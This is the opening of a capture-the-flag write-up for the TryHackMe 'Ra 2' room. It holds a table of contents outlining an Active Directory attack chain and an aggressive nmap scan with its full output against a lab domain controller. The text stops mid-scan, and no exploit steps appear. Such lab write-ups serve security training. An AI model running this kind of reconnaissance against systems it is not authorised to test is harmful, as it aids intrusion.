<p align="center">
  THM : Ra 2<br>
  Difficulty : Hard<br>
  Room link : https://tryhackme.com/room/ra2<br>
  <img src="https://i.imgur.com/DxAegLo.jpg">
</p>

## Summary

- [Nmap scan](#nmap-scan)
- [Web enumeration](#web-enumeration)
- [DNS enumeration](#dns-enumeration)
- [Certificate cracking](#certificate-cracking)
- [DNS update](#dns-update)
- [NTLM hash capture](#ntlm-hash-capture)
- [NTLM hash cracking](#ntlm-hash-cracking)
- [Windows enumeration](#windows-enumeration)
- [Privilege escalation](#privilege-escalation)
- [Conclusion](#conclusion)

## Nmap scan

First, let's run an agressive [nmap](https://nmap.org/book/man.html) scan against the target :  
```
# Nmap 7.80 scan initiated Mon Feb 13 15:12:56 2023 as: nmap -A -p- -oN nmapResults.txt -d 10.10.35.128
--------------- Timing report ---------------
  hostgroups: min 1, max 100000
  rtt-timeouts: init 1000, min 100, max 10000
  max-scan-delay: TCP 1000, UDP 1000, SCTP 1000
  parallelism: min 0, max 0
  max-retries: 10, host-timeout: 0
  min-rate: 0, max-rate: 0
---------------------------------------------
Got nsock CONNECT response with status TIMEOUT - aborting this service
Got nsock CONNECT response with status TIMEOUT - aborting this service
Got nsock CONNECT response with status TIMEOUT - aborting this service
Got nsock CONNECT response with status TIMEOUT - aborting this service
Nmap scan report for 10.10.35.128
Host is up, received syn-ack (0.038s latency).
Scanned at 2023-02-13 15:12:57 CET for 609s
Not shown: 65498 filtered ports
Reason: 65498 no-responses
PORT      STATE SERVICE             REASON  VERSION
53/tcp    open  domain?             syn-ack
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open  http                syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://fire.windcorp.thm/
88/tcp    open  kerberos-sec        syn-ack Microsoft Windows Kerberos (server time: 2023-02-13 14:15:58Z)
135/tcp   open  msrpc               syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn         syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap                syn-ack Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-29T03:31:08
| Not valid after:  2028-05-29T03:41:03
| MD5:   804b dc39 5ce5 dd7b 19a5 851c 01d1 23ad
|_SHA-1: 37f4 e667 cef7 5cc4 47c9 d201 25cf 2b7d 20b2 c1f4
|_ssl-date: 2023-02-13T14:18:55+00:00; 0s from scanner time.
443/tcp   open  ssl/http            syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-cisco-anyconnect: 
|_  ERROR: Failed to connect to SSL VPN server
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-29T03:31:08
| Not valid after:  2028-05-29T03:41:03
| MD5:   804b dc39 5ce5 dd7b 19a5 851c 01d1 23ad
|_SHA-1: 37f4 e667 cef7 5cc4 47c9 d201 25cf 2b7d 20b2 c1f4
|_ssl-date: 2023-02-13T14:18:55+00:00; +1s from scanner time.
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?       syn-ack
464/tcp   open  kpasswd5?           syn-ack
593/tcp   open  ncacn_http          syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap            syn-ack
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-29T03:31:08
| Not valid after:  2028-05-29T03:41:03
| MD5:   804b dc39 5ce5 dd7b 19a5 851c 01d1 23ad
|_SHA-1: 37f4 e667 cef7 5cc4 47c9 d201 25cf 2b7d 20b2 c1f4
|_ssl-date: 2023-02-13T14:18:55+00:00; 0s from scanner time.
2179/tcp  open  vmrdp?              syn-ack
3268/tcp  open  ldap                syn-ack Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-29T03:31:08
| Not valid after:  2028-05-29T03:41:03
| MD5:   804b dc39 5ce5 dd7b 19a5 851c 01d1 23ad
|_SHA-1: 37f4 e667 cef7 5cc4 47c9 d201 25cf 2b7d 20b2 c1f4
|_ssl-date: 2023-02-13T14:18:55+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap            syn-ack Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-29T03:31:08
| Not valid after:  2028-05-29T03:41:03
| MD5:   804b dc39 5ce5 dd7b 19a5 851c 01d1 23ad
|_SHA-1: 37f4 e667 cef7 5cc4 47c9 d201 25cf 2b7d 20b2 c1f4
|_ssl-date: 2023-02-13T14:18:55+00:00; +1s from scanner time.
3389/tcp  open  ms-wbt-server       syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WINDCORP
|   NetBIOS_Domain_Name: WINDCORP
|   NetBIOS_Computer_Name: FIRE
|   DNS_Domain_Name: windcorp.thm
|   DNS_Computer_Name: Fire.windcorp.thm
|   DNS_Tree_Name: windcorp.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2023-02-13T14:18:16+00:00
| ssl-cert: Subject: commonName=Fire.windcorp.thm
| Issuer: commonName=Fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-02-12T13:24:01
| Not valid after:  2023-08-14T13:24:01
| MD5:   f9a4 71a1 5173 2747 4fbc 0419 c9bc 8a81
|_SHA-1: fe66 e873 ccbb 6fd2 049b d475 797d 4c3f 6215 7dc1
|_ssl-date: 2023-02-13T14:18:55+00:00; 0s from scanner time.
5222/tcp  open  jabber              syn-ack
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
| ssl-date: 
|_  ERROR: Unable to obtain data from the target
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
| 
|     features: 
| 
|     capabilities: 
| 
|     auth_mechanisms: 
| 
|     stream_id: 7y1dkhxsig
|     compression_methods: 
| 
|     errors: 
|       invalid-namespace
|       (timeout)
|     xmpp: 
|_      version: 1.0
5223/tcp  open  ssl/hpvirtgrp?      syn-ack
| ssl-date: 
|_  ERROR: Unable to obtain data from the target
5229/tcp  open  jaxflow?            syn-ack
5262/tcp  open  jabber              syn-ack
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
| 
|     features: 
| 
|     capabilities: 
| 
|     auth_mechanisms: 
| 
|     stream_id: 40cczm0zm1
|     compression_methods: 
| 
|     errors: 
|       invalid-namespace
|       (timeout)
|     xmpp: 
|_      version: 1.0
5263/tcp  open  ssl/unknown         syn-ack
| ssl-date: 
|_  ERROR: Unable to obtain data from the target
5269/tcp  open  xmpp                syn-ack Wildfire XMPP Client
| ssl-date: 
|_  ERROR: Unable to obtain data from the target
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
| 
|     capabilities: 
| 
|     compression_methods: 
| 
|     features: 
| 
|     auth_mechanisms: 
| 
|     errors: 
|       (timeout)
|_    xmpp: 
5270/tcp  open  ssl/xmp?            syn-ack
| ssl-date: 
|_  ERROR: Unable to obtain data from the target
5275/tcp  open  jabber              syn-ack
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
| 
|     features: 
| 
|     capabilities: 
| 
|     auth_mechanisms: 
| 
|     stream_id: 3kkj45y119
|     compression_methods: 
| 
|     errors: 
|       invalid-namespace
|       (timeout)
|     xmpp: 
|_      version: 1.0
5276/tcp  open  ssl/unknown         syn-ack
| ssl-date: 
|_  ERROR: Unable to obtain data from the target
7070/tcp  open  http                syn-ack Jetty 9.4.18.v20190429
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Jetty(9.4.18.v20190429)
|_http-title: Openfire HTTP Binding Service
7443/tcp  open  ssl/http            syn-ack Jetty 9.4.18.v20190429
| http-cisco-anyconnect: 
|_  ERROR: Not a Cisco ASA or unsupported version
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Jetty(9.4.18.v20190429)
|_http-title: Openfire HTTP Binding Service
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715 5425 83f3 a20f 75c8 ca2d 3353 cbb7
|_SHA-1: 97f7 0772 a26b e324 7ed5 bbcb 5f35 7d74 7982 66ae
| ssl-date: 
|_  ERROR: Unable to obtain data from the target
7777/tcp  open  socks5              syn-ack (No authentication; connection failed)
| socks-auth-info: 
|_  No authentication
9090/tcp  open  zeus-admin?         syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, Kerberos, NCP, NotesRPC, SMBProgNeg, X11Probe, afp, drda, ibm-db2-das, informix, oracle-tns: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Mon, 13 Feb 2023 14:16:11 GMT
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 267
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
|     <title>Error 404 Not Found</title>
|     </head>
|     <body><h2>HTTP ERROR 404</h2>
|     <p>Problem accessing /nice%20ports%2C/Tri%6Eity.txt%2ebak. Reason:
|     <pre> Not Found</pre></p>
|     </body>
|     </html>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Mon, 13 Feb 2023 14:16:04 GMT
|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Mon, 13 Feb 2023 14:16:10 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help, SqueezeCenter_CLI: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   LANDesk-RC: 
|     HTTP/1.1 400 Illegal character CNTL=0x4
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
|   LDAPBindReq: 
|     HTTP/1.1 400 Illegal character CNTL=0xc
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0xc</pre>
|   LDAPSearchReq: 
|     HTTP/1.1 400 Illegal character OTEXT=0x84
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x84</pre>
|   LPDString, WMSRequest, giop: 
|     HTTP/1.1 400 Illegal character CNTL=0x1
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x1</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest, SIPOptions: 
|     HTTP/1.1 400 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq, TLSSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
|   TerminalServer, TerminalServerCookie: 
|     HTTP/1.1 400 Illegal character CNTL=0x3
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x3</pre>
|   ms-sql-s: 
|     HTTP/1.1 400 Illegal character CNTL=0x12
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x12</pre>
9091/tcp  open  ssl/xmltec-xmlmail? syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, Kerberos, NCP, NotesRPC, SMBProgNeg, X11Probe, afp, oracle-tns: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Mon, 13 Feb 2023 14:16:24 GMT
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 267
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
|     <title>Error 404 Not Found</title>
|     </head>
|     <body><h2>HTTP ERROR 404</h2>
|     <p>Problem accessing /nice%20ports%2C/Tri%6Eity.txt%2ebak. Reason:
|     <pre> Not Found</pre></p>
|     </body>
|     </html>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Mon, 13 Feb 2023 14:16:21 GMT
|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Mon, 13 Feb 2023 14:16:22 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   LANDesk-RC: 
|     HTTP/1.1 400 Illegal character CNTL=0x4
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
|   LDAPBindReq: 
|     HTTP/1.1 400 Illegal character CNTL=0xc
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0xc</pre>
|   LDAPSearchReq: 
|     HTTP/1.1 400 Illegal character OTEXT=0x84
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x84</pre>
|   LPDString, WMSRequest, giop: 
|     HTTP/1.1 400 Illegal character CNTL=0x1
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x1</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest, SIPOptions: 
|     HTTP/1.1 400 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq, TLSSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
|   TerminalServer, TerminalServerCookie: 
|     HTTP/1.1 400 Illegal character CNTL=0x3
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x3</pre>
|   ms-sql-s: 
|     HTTP/1.1 400 Illegal character CNTL=0x12
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x12</pre>
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715 5425 83f3 a20f 75c8 ca2d 3353 cbb7
|_SHA-1: 97f7 0772 a26b e324 7ed5 bbcb 5f35 7d74 7982 66ae
| ssl-date: 
|_  ERROR: Unable to obtain data from the target
9389/tcp  open  mc-nmf              syn-ack .NET Message Framing
49667/tcp open  msrpc               syn-ack Microsoft Windows RPC
49668/tcp open  ncacn_http          syn-ack Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc               syn-ack Microsoft Windows RPC
49670/tcp open  msrpc               syn-ack Microsoft Windows RPC
49672/tcp open  msrpc               syn-ack Microsoft Windows RPC
49688/tcp open  msrpc               syn-ack Microsoft Windows RPC
49702/tcp open  msrpc               syn-ack Microsoft Windows RPC
6 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port53-TCP:V=7.80%I=7%D=2/13%Time=63EA4622%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5222-TCP:V=7.80%I=7%D=2/13%Time=63EA4631%P=x86_64-pc-linux-gnu%r(RP
SF:CCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org/s
SF:treams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-stream
SF:s\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5262-TCP:V=7.80%I=7%D=2/13%Time=63EA4631%P=x86_64-pc-linux-gnu%r(RP
SF:CCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org/s
SF:treams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-stream
SF:s\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5275-TCP:V=7.80%I=7%D=2/13%Time=63EA4638%P=x86_64-pc-linux-gnu%r(RP
SF:CCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org/s
SF:treams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-stream
SF:s\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9090-TCP:V=7.80%I=7%D=2/13%Time=63EA4624%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,11D,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2013\x20Feb\x202
SF:023\x2014:16:04\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x202020\x
SF:2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x20by
SF:tes\r\nContent-Length:\x20115\r\n\r\n<html>\n<head><title></title>\n<me
SF:ta\x20http-equiv=\"refresh\"\x20content=\"0;URL=index\.jsp\">\n</head>\
SF:n<body>\n</body>\n</html>\n\n")%r(JavaRMI,C3,"HTTP/1\.1\x20400\x20Illeg
SF:al\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8
SF:859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x
SF:20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0</
SF:pre>")%r(WMSRequest,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNT
SF:L=0x1\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Lengt
SF:h:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><
SF:pre>reason:\x20Illegal\x20character\x20CNTL=0x1</pre>")%r(ibm-db2-das,C
SF:3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type
SF::\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnectio
SF:n:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illega
SF:l\x20character\x20CNTL=0x0</pre>")%r(SqueezeCenter_CLI,9B,"HTTP/1\.1\x2
SF:0400\x20No\x20URI\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nC
SF:ontent-Length:\x2049\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\
SF:x20400</h1><pre>reason:\x20No\x20URI</pre>")%r(informix,C3,"HTTP/1\.1\x
SF:20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html
SF:;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\
SF:n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character
SF:\x20CNTL=0x0</pre>")%r(drda,C3,"HTTP/1\.1\x20400\x20Illegal\x20characte
SF:r\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nConte
SF:nt-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x204
SF:00</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0</pre>")%r(HTTPO
SF:ptions,56,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2013\x20Feb\x202023
SF:\x2014:16:10\x20GMT\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n")%r(RTSP
SF:Request,AD,"HTTP/1\.1\x20400\x20Unknown\x20Version\r\nContent-Type:\x20
SF:text/html;charset=iso-8859-1\r\nContent-Length:\x2058\r\nConnection:\x2
SF:0close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Unknown\x20
SF:Version</pre>")%r(RPCCheck,C7,"HTTP/1\.1\x20400\x20Illegal\x20character
SF:\x20OTEXT=0x80\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCont
SF:ent-Length:\x2071\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20
SF:400</h1><pre>reason:\x20Illegal\x20character\x20OTEXT=0x80</pre>")%r(DN
SF:SVersionBindReqTCP,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL
SF:=0x0\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length
SF::\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><p
SF:re>reason:\x20Illegal\x20character\x20CNTL=0x0</pre>")%r(DNSStatusReque
SF:stTCP,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nConte
SF:nt-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nCo
SF:nnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x2
SF:0Illegal\x20character\x20CNTL=0x0</pre>")%r(Help,9B,"HTTP/1\.1\x20400\x
SF:20No\x20URI\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent
SF:-Length:\x2049\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400
SF:</h1><pre>reason:\x20No\x20URI</pre>")%r(SSLSessionReq,C5,"HTTP/1\.1\x2
SF:0400\x20Illegal\x20character\x20CNTL=0x16\r\nContent-Type:\x20text/html
SF:;charset=iso-8859-1\r\nContent-Length:\x2070\r\nConnection:\x20close\r\
SF:n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character
SF:\x20CNTL=0x16</pre>")%r(TerminalServerCookie,C3,"HTTP/1\.1\x20400\x20Il
SF:legal\x20character\x20CNTL=0x3\r\nContent-Type:\x20text/html;charset=is
SF:o-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Ba
SF:d\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x
SF:3</pre>")%r(TLSSessionReq,C5,"HTTP/1\.1\x20400\x20Illegal\x20character\
SF:x20CNTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nConten
SF:t-Length:\x2070\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x2040
SF:0</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x16</pre>")%r(Kerbe
SF:ros,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent
SF:-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConn
SF:ection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20I
SF:llegal\x20character\x20CNTL=0x0</pre>")%r(SMBProgNeg,C3,"HTTP/1\.1\x204
SF:00\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;ch
SF:arset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r
SF:\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x2
SF:0CNTL=0x0</pre>")%r(X11Probe,C3,"HTTP/1\.1\x20400\x20Illegal\x20charact
SF:er\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCont
SF:ent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20
SF:400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0</pre>")%r(Four
SF:OhFourRequest,1BD,"HTTP/1\.1\x20404\x20Not\x20Found\r\nDate:\x20Mon,\x2
SF:013\x20Feb\x202023\x2014:16:11\x20GMT\r\nCache-Control:\x20must-revalid
SF:ate,no-cache,no-store\r\nContent-Type:\x20text/html;charset=iso-8859-1\
SF:r\nContent-Length:\x20267\r\n\r\n<html>\n<head>\n<meta\x20http-equiv=\"
SF:Content-Type\"\x20content=\"text/html;charset=utf-8\"/>\n<title>Error\x
SF:20404\x20Not\x20Found</title>\n</head>\n<body><h2>HTTP\x20ERROR\x20404<
SF:/h2>\n<p>Problem\x20accessing\x20/nice%20ports%2C/Tri%6Eity\.txt%2ebak\
SF:.\x20Reason:\n<pre>\x20\x20\x20\x20Not\x20Found</pre></p>\n</body>\n</h
SF:tml>\n")%r(LPDString,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CN
SF:TL=0x1\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Leng
SF:th:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1>
